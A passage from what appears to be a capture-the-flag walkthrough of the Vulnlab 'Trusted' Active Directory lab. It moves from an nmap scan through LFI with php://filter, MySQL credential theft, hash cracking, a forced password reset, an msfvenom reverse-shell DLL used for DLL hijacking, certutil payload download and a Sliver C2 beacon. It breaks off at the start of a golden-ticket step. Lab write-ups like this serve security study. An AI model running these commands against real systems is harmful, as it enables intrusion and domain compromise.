commonName=trusteddc.trusted.vl\n| Not valid before: 2024-04-30T15:22:54\n|_Not valid after:  2024-10-30T15:22:54\n| rdp-ntlm-info: \n|   Target_Name: TRUSTED\n|   NetBIOS_Domain_Name: TRUSTED\n|   NetBIOS_Computer_Name: TRUSTEDDC\n|   DNS_Domain_Name: trusted.vl\n|   DNS_Computer_Name: trusteddc.trusted.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-05-01T15:42:31+00:00\n|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326\nOS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS\nOS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=\nOS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT\nOS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF\nOS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T\nOS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%\nOS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80\nOS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q\nOS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A\nOS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R\nOS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-05-01T15:42:33\n|_  start_date: N/A\n|_clock-skew: mean: 1s, deviation: 0s, median: 1s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   105.46 ms 10.8.0.1\n2   105.84 ms 10.10.155.37\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 169.08 seconds\n\nNmap scan report for 10.10.155.38\nHost is up (0.10s latency).\nNot shown: 985 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)\n|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6\n| http-title: Welcome to XAMPP\n|_Requested resource was http://10.10.155.38/dashboard/\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6\n| tls-alpn: \n|_  http/1.1\n| http-title: Welcome to XAMPP\n|_Requested resource was https://10.10.155.38/dashboard/\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.5.5-10.4.24-MariaDB\n|   Thread ID: 9\n|   Capabilities flags: 63486\n|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins\n|   Status: Autocommit\n|   Salt: n;xn=$:7D2kEU_Z'SJ[i\n|_  Auth Plugin Name: mysql_native_password\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.\n| ssl-cert: Subject: commonName=labdc.lab.trusted.vl\n| Not valid before: 2024-04-30T15:22:56\n|_Not valid after:  2024-10-30T15:22:56\n| rdp-ntlm-info: \n|   Target_Name: LAB\n|   NetBIOS_Domain_Name: LAB\n|   NetBIOS_Computer_Name: LABDC\n|   DNS_Domain_Name: lab.trusted.vl\n|   DNS_Computer_Name: labdc.lab.trusted.vl\n|   DNS_Tree_Name: trusted.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-05-01T15:43:26+00:00\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326\nOS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T\nOS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I\nOS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D\nOS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%\nOS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC\nOS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=\nOS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF\nOS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-05-01T15:43:29\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 1s, deviation: 0s, median: 1s\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   105.77 ms 10.8.0.1\n2   105.78 ms 10.10.155.38\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.35 seconds\n```\n\nAfter our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being `trusteddc.trusted.vl` and the second being `labdc.lab.trusted.vl`. On the second machine, it seems that we have port 80 open, so we'll look at that for the foothold of our attack path. Would like to note that the name of the chain is `Trusted` and we have two DCs, meaning we'll probably have to exploit some form of domain trust or delegation between the two DCs.\n\nUpon enumerating the website, we've seem to have found a landing page for XAMPP/Maria DB (MySQL). Would like to note that port 3306 `MySQL` is open on this machine.\n`gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/img/]\n/dev                  (Status: 301) [Size: 334] [--> http://10.10.155.38/dev/]\n/examples             (Status: 503) [Size: 401]\n/licenses             (Status: 403) [Size: 420]\n/dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/dashboard/]\n/%20                  (Status: 403) [Size: 301]\n/IMG                  (Status: 301) [Size: 334] [--> http://10.10.155.38/IMG/]\n/*checkout*           (Status: 403) [Size: 301]\n/Img                  (Status: 301) [Size: 334] [--> http://10.10.155.38/Img/]\n/phpmyadmin           (Status: 403) [Size: 301]\n/webalizer            (Status: 403) [Size: 301]\n/*docroot*            (Status: 403) [Size: 301]\n/*                    (Status: 403) [Size: 301]\n/con                  (Status: 403) [Size: 301]\n/Dashboard            (Status: 301) [Size: 340] [--> http://10.10.155.38/Dashboard/]\n```\n\nThe `dev` directory seems to be relatively interesting, as I don't commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled `Manes Winchester Family Law Firm`, with directories `Home`, `About`, and `Contact`. Not only that, but it seems that we immediately see a message on the bottom of the `Home` page from one of the web developers.\n\n![](/images/vulnlab/trusted-vl/b.jpg)\n\nThis gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the `mysql_native_password` authentication plugin). Let's try to look around the website some more and see if we can find any SQL vulnerabilities, I'll enumerate a bit and see what I can find.\n\nLet's run a `gobuster` scan against `/dev` to see if we can find this database connection.\n`gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 'php'`\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/images/]\n/Images               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/Images/]\n/css                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/css/]\n/db.php               (Status: 200) [Size: 22]\n/IMAGES               (Status: 301) [Size: 341] [--> http://10.10.155.38/dev/IMAGES/]\n/%20                  (Status: 403) [Size: 301]\n/*checkout*           (Status: 403) [Size: 301]\n/*checkout*.php       (Status: 403) [Size: 301]\n/CSS                  (Status: 301) [Size: 338] [--> http://10.10.155.38/dev/CSS/]\n/*docroot*            (Status: 403) [Size: 301]\n/*docroot*.php        (Status: 403) [Size: 301]\n/DB.php               (Status: 200) [Size: 22]\n```\n\n# PHP SQLi\n\nUsually whenever you look around for SQL Injection, you're mainly looking for a parameter to inject content into, such as `name` or `id`. This was not the case for us, as `db.php` did not have any other parameters that we can place anything into. The only result we receive from accessing `db.php` is a `Connection successful` message, however there's pretty much nothing we can do with it.\n\n![](/images/vulnlab/trusted-vl/c.jpg)\n\nThat being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.\n`http://10.10.162.38/dev/index.html?view=contact.html`\n\nThis was the contact page from the landing website directory in `/dev`. Since we have a `?view` parameter, there's an opportunity to exploit LFI.\n\nTo those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim's machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.\n\nLet's test this out on that `contact.html` page we were referring to earlier. We'll try to access `C:\\Users` to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump `/etc/passwd`.)\n`http://10.10.162.38/dev/index.html?view=C:\\Users`\n\n![](/images/vulnlab/trusted-vl/d.jpg)\n\nIt seems that we don't have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be `C:\\xampp\\htdocs\\dev`. In that case, let's try to access that `db.php` page from here and view it's contents.\n`http://10.10.162.38/dev/index.html?view=C:\\xampp\\htdocs\\dev\\db.php`\n\n![](/images/vulnlab/trusted-vl/e.jpg)\n\n# SQLi PHP Filter Bypass\n\nIt seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using `php://filter`. Note that we can use a `php://filter` to query database results, in this case we are querying the contents of __THIS SPECIFIC FILE__. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in `db.php`'s code.\n\n`http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php`\nSo to recap, we're doing the following in this URL:\n1. Use the view parameter to start the LFI statement.\n2. Use a PHP filter to convert all contents that we dump to base64.\n3. Using the parameter `resource` to say that we want to dump all contents of `db.php` to base64.\n\n![](/images/vulnlab/trusted-vl/f.jpg)\n\nLooks as though the contents were dumped to the website, meaning we can decode this and see the real contents of `db.php`.\n`PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=`\n\nFrom here, it's just a simple base64 decode in our terminal to find out the contents.\n```\necho \"PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=\" | base64 -d\n```\n\n```\n<?php \n$servername = \"localhost\";\n$username = \"root\";\n$password = \"[...snip...]\";\n\n$conn = mysqli_connect($servername, $username, $password);\n\nif (!$conn) {\n  die(\"Connection failed: \" . mysqli_connect_error());\n}\necho \"Connected successfully\";\n?>\n```\n\n# MySQL Enumeration\n\nIf you remember from earlier, our NMAP scan told us earlier that the `MySQL` service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.\n`mysql -h 10.10.162.38 -u 'root' -p`\n\nThis gives us access to the `MariaDB` database, to which we can look around for any credentials to the Active Directory instance.\nUpon some enumerating, I found some credentials in the `news` database.\n`select * from users;`\n\n```\n+----+------------+--------------+-----------+----------------------------------+\n| id | first_name | short_handle | last_name | password                         |\n+----+------------+--------------+-----------+----------------------------------+\n|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |\n|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |\n|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |\n+----+------------+--------------+-----------+----------------------------------+\n```\n\nOriginally I had thought that these hashes were LM hashes, however upon testing them with `crackmapexec` and `hashcat auto-detect mode`, it seems that they may very well be another hashing algorithm. After a bit of testing with `jtr` it seems that this specific hashing algorithm is `Raw-MD5`\n`john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5`\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\n[...snip...]       (?)     \n1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```\n\nThis gives us the plaintext of `rsmith`'s password, which we can use to do dump a lot of other things around this specific domain controller.\n\nTesting the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.\n`crackmapexec ldap 10.10.157.166 -u 'rsmith' -p '[...snip...]'`\n\n```\nSMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\\rsmith:[...snip...]\n```\n\nNow that we have verified that `rsmith`'s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.\n\n# Dumping LDAP\n\nNormally you'd be able to use `ldapdomaindump`, however I'm more used to using the Bloodhound-Python ingestor. I've also found that `ldapdomaindump` still does not work after remediating an error that you'll see pretty soon with the Python ingestor. Nonetheless I'd still like to include what the `ldapdomaindump` command would look like in this context.\n `ldapdomaindump -u LABDC\\\\'rsmith' -p '[...snip...]' ldap://10.10.157.166:389`\n`BloodHound.py/bloodhound.py -d 'trusted.vl' -u 'rsmith' -p [...snip...] -c all -ns 10.10.157.166 --zip`\nhttps://github.com/dirkjanm/BloodHound.py\n\nIt seems I've encountered an issue that I've never come into contact before. Upon running this command, you'll find that a nameserver error occurs based on an invalid query.\n`dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL`\n\nI couldn't find why this issue occurs, however my guess is that the domain `trusted.vl` is either rerouting or denying all DNS nameserver replies that come into contact with the domain.\nWe can circumvent this issue by using `dnschef`,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.\n\nNote that you'll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.\n`dnschef --fakeip 10.10.157.166`\n`BloodHound.py/bloodhound.py -d 'lab.trusted.vl' -u 'rsmith' -p '[...snip...]' -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl`\n\nThis is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.\n\nAfter receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what `rsmith` can do.\n\nIn case you are unfamiliar with how to set up Bloodhound, here's a beginner walkthrough to do before the next step in this walkthrough. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\n\nAfter uploading the zip folder to Bloodhound, let's search up the domain object for `rsmith@lab.trusted.vl`. After selecting `Node Info`, we can see that `rsmith` has an1 outbound object control.\n\n![](/images/vulnlab/trusted-vl/g.jpg)\n\nIt seems that `rsmith` has `ForceChangePassword` rights onto `ewalters`, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - `rsmith` has the ability to force a password reset on `ewalters`, meaning we can do exactly that.\n\n# ForceChangePassword Object Control\n\nTo reset a user's password with this outbound object control, you can use tools such as `rpcclient` or `bloodyad`. I'm more used to using `bloodyad` so that's what we'll use in our situation. `bloodyAD/bloodyAD.py -u 'rsmith' -p '[...snip...]' -d 'lab.trusted.vl' --host 10.10.157.166 set password 'ewalters' 'password123@'`\n\nI changed `ewalters` password to something simple, however you can make it whatever you'd like. If successful, you'll receive a small `[+] Password has changed successfully!` message. This indicates that the password for `ewalters` has been changed amongst the entire domain.\n\nWe can now verify that the changes have been made with CrackMapExec. I've decided to use a one-liner with all of the CME services separated by a newline in a text file.\n`for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u 'ewalters' -p 'password123@'; done`\n\nYou'll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.\n\n```\nSMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)\nHTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman\nWINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\\ewalters:password123@ (Pwn3d!)\n```\n\nSo from here we'll use `evil-winrm` to authenticate through WinRM with the `ewalters` user.\n\n`evil-winrm --ip 10.10.157.166 -u 'ewalters' -p 'password123@'`\n\n![](/images/vulnlab/trusted-vl/h.jpg)\n\n# DC1 Host Reconnaissance\n\nWhile normally we'd get the user flag at this point, `r0BIT` messed around with us and left a fake flag in `ewalters` Desktop directory.\n\n```\n*Evil-WinRM* PS C:\\Users\\ewalters\\Documents> cd ../Desktop\n*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop> ls\n\n\n    Directory: C:\\Users\\ewalters\\Desktop\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website\n-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website\n-a----         9/18/2022   9:12 PM         202492 robitcat.jpg\n-a----         9/18/2022   9:11 PM            108 User.txt\n\n\nc*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop> cat User.txt\n|\\---/|\n| o_o |\n \\_^_/\nThese are not the flags you're looking for.\nTake :robitcat: as compensation :).\n```\n\nIt looks like we'll need to look around a little more and escalate to another user to get the user flag. My guess is that we'll need to get to `cpowers`, who was the third and final user that we were able dumped from the SQL database.\n\nWhile I was looking around the filesystem for any leads, I stumbled across a folder in the `C:\\` directory titled, `AVTest`. This isn't a folder that's here regularly so let's take a look into it a little more.\n\n```\n*Evil-WinRM* PS C:\\AVTest> ls\n\n\n    Directory: C:\\AVTest\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe\n-a----         9/14/2022   7:05 PM            235 readme.txt\n\n\n*Evil-WinRM* PS C:\\AVTest> cat readme.txt\nSince none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.\nI asked Christine to run them a few times, just to be sure.\n\nLet's just hope we don't have to set this lab up again because of this.\n```\n\nThe `readme.txt` tells us that the AV tools are being disposed of, however it seems that the `cpowers` user will be running this executable a few more times before the dispose is initiated.\n\nIn a regular red-teaming context, we need to ensure that we move hastily upon seeing this. We may not know the timeframe when the `cpowers` user is going to execute values.\nAt the same time, this is a pen-testing lab, so I'm going to assume that there's a scheduled task running every now and then that will execute the file - just my logical thinking though.\n\nNot only that, but if we take a look at `cpowers` in Bloodhound, we can see that they're part of the Domain Admins group for this domain.\n\n![](/images/vulnlab/trusted-vl/i.jpg)\n\nThis means that if we compromise `cpowers`, we'll have full control over this domain controller.\n\nLet's examine this file to see if there's anything we can do to escalate our privileges when `cpowers` runs it. Normally I'd just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket's `smbserver` utility.\n\nKali - `impacket-smbserver smb share/ -smb2support`\nWinRM - `copy KasperskyRemovalTool.exe \\\\10.8.0.173\\smb\\KasperskyRemovalTool.exe`\n\nThis should download the AV tool into our `share/` directory (that we might need to create locally before setting up the SMB server).\n\nSo this next part was where I got confused, as examining this with tools such as Ghidra didn't result in many finds. Usually when it comes to reverse engineering PE32 binaries, you'd want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don't seem to be noteworthy enough to look into.\n\nLooking into CVE's didn't seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. https://www.exploit-db.com/exploits/10484\nWhile we know that the starting functions don't seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?\n\nI decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.\nNote that I was running my machine through a Kali Linux VM, so I'll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.\n\n# ProcMon Executable Reverse Engineering\n\nThere are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I'll still leave the link for it as provided here: https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\n\n![](/images/vulnlab/trusted-vl/j.jpg)\n\nBefore we run the file, we should make sure that we have the right filters set up since we'll get barraged with internal functions and files that the binary will use during runtime. Go to `Filter > Filter` (or just press `Ctrl + l`\n\nOn this screen, we can create filters to view only a section of processes and/or functions that interest us.\n\n![](/images/vulnlab/trusted-vl/k.jpg)\n\nFor simplicities sake, I've outlined the filter parameters that we'll need to detect the processes of interest.\n\n`Process Name - contains - Kaspersky -> then Include`\n`Path - ends with - .dll -> then Include`\n\nRunning the file with these two filters still leaves us with a barrage of information, however you'll notice that many of the DLLs have a `Result` value of `NAME NOT FOUND`. This is particularly interesting, as the `File Path` for the DLL is within the same directory of the binary that was executed.\n\nWe'll also put down these results as another filter to see specifically what DLLs these results entail.\n\n`Result - is - NAME NOT FOUND -> then Include`\n\n![](/images/vulnlab/trusted-vl/l.jpg)\n\nThere are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in `Downloads\\kas\\`). This presents us with a vulnerability that is also new for my research - DLL Hijacking.\n\n# DLL Hijacking\n\nDLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.\n\nI plan on making a research post about DLL Hijacking in the future, however in the meantime I've referenced a HackTricks post that illustrates it relatively well.\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\n\nSo in that case let's give it a try. We'll start by creating a malicious DLL with `msfvenom`, which can be done using the following command. I initially tried this with replacing `USP10.dll`, however I found that it wouldn't spawn a reverse shell as intended. Instead, we'll use the `KasperskyRemovalToolENU.dll` that is called multiple times during runtime.\n`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll > KasperskyRemovalToolENU.dll`\n\nWe'll then set up a Python web server with `python3 -m http.server 9002` to transfer the file.\nAlso, we'll set up a netcat reverse shell so that when `cpowers` executes the Kaspersky tool binary, we'll get a callback after our malicious DLL is ran.\n\nOn Kali - `nc -lvnp 9001`\nOn WinRM - `certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll`\n\nAfter a few seconds of waiting, our netcat listener should spawn a reverse shell as `cpowers`.\n\n![](/images/vulnlab/trusted-vl/m.jpg)\n\nSince we are now a DA, we can read the user flag that is present in the `Administrator` directory.\n\n`PS C:\\Windows\\system32> cd C:\\Users\\Administrator\\Desktop; cat User.txt`\n\nFrom here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.\n\nNote that we couldn't do this previously as `ewalters`, as there was a GPO that restricted us from doing so.\nIf you're unaware on how to set up a Sliver C2 server, I'll reference the material needed to do so here: https://github.com/BishopFox/sliver\n`sliver > mtls`\n`generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)`\n\nAfter transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.\n\n![](/images/vulnlab/trusted-vl/n.jpg)\n\nSo to start, my first guess is that there's some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain's name `Trusted`. There's two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.\n\n# Domain Trust Enumeration\n\nWe can enumerate the domain locally with `Get-ADTrust`, a regular PowerShell module that is present on this machine. \n`Get-ADTrust -Filter *`\n\nAnother is to drop `PowerView` to the machine and then import it.\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\n`Import-Module .\\PowerView.ps1; Get-DomainTrust`\n\nFinally, we can also use `sharpview`, a .NET version of `PowerView` that is present in Sliver's `armory` function.\n`sliver > armory install sharpview`\n`sliver > sharpview Get-Domain`\nThe only issue with `sharpview` is that I was running into an LDAP issue (when running `Get-DomainTrust`, so I'll just use the local `PowerView` option we discussed about previously.\n\nAfter running `Get-DomainTrust` or `Get-ADTrust`, we receive the following output.\n\n![](/images/vulnlab/trusted-vl/o.jpg)\n\nThis means that there is a `Bidirectional` domain trust between both the child domain `lab.trusted.vl` and the parent domain `trusted.vl`. What this essentially means is that both domains `lab.trusted.vl` and `trusted.vl` trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.\n\nI'd like to create a blog post about this in the future, as the term for this is called `Domain Dominance` and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in `Bloodhound` by looking at the `Map Domain Trusts` in the `Analysis` tab.\n\n![](/images/vulnlab/trusted-vl/p.jpg)\n\nThis also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain's `krbtgt` service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the `krbtgt` AES or NTLM hash, you can essentially perform almost any domain attack that you'd like (such as `dcsync` as an example).\n\nIn order to exploit the domain trust, we'll need three different things: \n* The `NTLM` of the `krbtgt` 